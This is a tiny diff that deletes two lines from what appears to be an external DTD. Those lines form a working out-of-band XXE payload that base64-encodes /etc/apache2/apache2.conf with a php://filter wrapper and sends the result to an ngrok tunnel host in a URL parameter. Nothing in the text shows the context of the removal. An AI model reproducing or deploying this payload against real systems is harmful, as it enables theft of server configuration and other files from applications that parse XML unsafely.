@@ -1,2 +1,0 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://b4d3bd27.ngrok.io/?collect=%file;'>">
